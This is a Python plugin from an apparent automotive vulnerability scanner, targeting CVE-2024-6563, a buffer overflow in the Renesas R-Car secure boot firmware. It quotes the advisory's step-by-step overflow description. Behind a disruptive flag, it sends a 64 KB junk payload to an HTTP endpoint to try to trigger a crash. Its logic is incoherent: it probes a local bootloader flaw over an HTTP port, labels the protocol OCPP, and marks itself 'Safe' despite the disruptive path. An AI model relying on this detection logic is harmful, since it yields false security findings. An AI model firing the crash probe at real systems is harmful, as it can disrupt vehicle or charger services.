#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent))
from probe_utils import HTTPProbe, detection_confidence, service_open

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin


VULN = {
    "id": 47,
    "cve": "CVE-2024-6563",
    "year": 2024,
    "domain": "IVI/EVSE/车载SoC",
    "vendor_product": "Renesas R-Car / ARM TF-A",
    "component": "secure boot",
    "type": "缓冲区拷贝越界",
    "summary": "启动链中输入长度未校验可能影响安全启动。",
    "source_description": "Buffer Copy without Checking Size of Input ('Classic Buffer Overflow') vulnerability in Renesas arm-trusted-firmware allows Local Execution of Code. This vulnerability is associated with program files  https://github.Com/renesas-rcar/arm-trusted-firmware/blob/rcar_gen3_v2.5/drivers/renesas/common/io/i... https://github.Com/renesas-rcar/arm-trusted-firmware/blob/rcar_gen3_v2.5/drivers/renesas/common/io/io_rcar.C .\n\n\n\n\nIn line 313 \"addr_loaded_cnt\" is checked not to be \"CHECK_IMAGE_AREA_CNT\" (5) or larger, this check does not halt the function. Immediately after (line 317) there will be an overflow in the buffer and the value of \"dst\" will be written to the area immediately after the buffer, which is \"addr_loaded_cnt\". This will allow an attacker to freely control the value of \"addr_loaded_cnt\" and thus control the destination of the write immediately after (line 318). The write in line 318 will then be fully controlled by said attacker, with whichever address and whichever value (\"len\") they desire.",
    "poc_status": "ZDI/ASRG公告；通常无公开完整PoC",
    "research_value": "多来自Pwn2Own/ASRG披露，适合攻击面枚举与固件安全研究。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2024-6563",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2024-6563",
        "https://github.com/renesas-rcar/arm-trusted-firmware/commit/235f85b654a031f7647e81b86fc8e4ffeb430164",
        "https://asrg.io/security-advisories/cve-2024-6563/",
        "https://cveawg.mitre.org/api/cve/CVE-2024-6563"
    ],
    "affected": [
        {
            "vendor": "Renesas",
            "product": "rcar_gen3_v2.5",
            "versions": [
                {
                    "version": "c2f286820471ed276c57e603762bd831873e5a17",
                    "status": "affected",
                    "lessThanOrEqual": "c9fb3558410032d2660c7f3b7d4b87dec09fe2f2",
                    "versionType": "git"
                }
            ]
        }
    ],
    "signature_tokens": [
        "CVE-2024-6563",
        "Renesas",
        "R-Car",
        "ARM",
        "TF-A",
        "secure",
        "boot",
        "Buffer",
        "Copy",
        "without",
        "Checking",
        "Size",
        "Input",
        "Classic",
        "Overflow",
        "vulnerability",
        "arm-trusted-firmware",
        "Local",
        "Execution",
        "Code",
        "associated",
        "program",
        "files",
        "https",
        "github.Com",
        "renesas-rcar",
        "blob",
        "rcar_gen3_v2.5",
        "drivers",
        "renesas"
    ]
}



def _run_poc(plugin) -> dict:
    """Probe CVE-2024-6563: Renesas R-Car management port oversized payload probe."""
    params = plugin.params or {}
    target_ip = params.get("target_ip", getattr(plugin, "target_ip", "127.0.0.1"))
    port = int(params.get("port", 8080))
    tls = bool(params.get("tls", False))
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or bool(params.get("allow_disruptive"))

    evidence = {
        "cve": "CVE-2024-6563",
        "target": f"{target_ip}:{port}",
        "technique": "HTTP behavioral probe - Renesas R-Car management port oversized data (BL2 OOB)",
    }

    active_port = None
    for try_port in [port, 80, 443, 8080, 9000]:
        if service_open(target_ip, try_port):
            active_port = try_port
            tls = try_port in (443, 8443)
            break

    if active_port is None:
        evidence["service_open"] = False
        return {
            "vulnerable": None,
            "evidence": evidence,
            "detection_confidence": detection_confidence("E", evidence, "no_service"),
            "requires_manual_review": True,
        }

    evidence["service_open"] = True
    evidence["actual_port"] = active_port
    probe = HTTPProbe(target_ip, active_port, tls=tls)

    r_version = probe.get("/version")
    evidence["version_status"] = r_version.get("status")
    evidence["version_body"] = r_version.get("body_text", "")[:200]

    r_root = probe.get("/")
    evidence["http_status"] = r_root.get("status")
    evidence["server_header"] = r_root.get("headers", {}).get("Server", "")

    if allow_disruptive:
        large_payload = b"A" * 65536
        r_overflow = probe.post("/api/image/load", large_payload, "application/octet-stream")
        evidence["overflow_status"] = r_overflow.get("status")
        evidence["overflow_error"] = r_overflow.get("error")
        if r_overflow.get("status") in (500, None) or r_overflow.get("error"):
            evidence["overflow_triggered"] = True
            return {
                "vulnerable": None,
                "evidence": evidence,
                "detection_confidence": detection_confidence("B", evidence, "overflow_response"),
                "requires_manual_review": True,
            }

    return {
        "vulnerable": None,
        "evidence": evidence,
        "detection_confidence": detection_confidence("C", evidence, "renesas_management_probed"),
        "requires_manual_review": True,
    }

class Poc40CVE20246563OutOfBoundsAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = 'XLSX-047'
    meta_poc_name = 'CVE-2024-6563 缓冲区拷贝越界 Active Validation'
    meta_cve_id = 'CVE-2024-6563'
    meta_severity = 'High'
    meta_protocol = 'ocpp'
    meta_target_os = ['all']
    meta_required_params = ['service_banner']
    meta_profiles = ['network']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2024-6563'
    meta_references       = ['https://nvd.nist.gov/vuln/detail/CVE-2024-6563']
    meta_attack_surface = '网络服务'
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "40_Renesas_RCar_Secure_Boot_Buffer_Copy_OOB_Audit") if "VULN" in dir() else "40_Renesas_RCar_Secure_Boot_Buffer_Copy_OOB_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc40CVE20246563OutOfBoundsAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
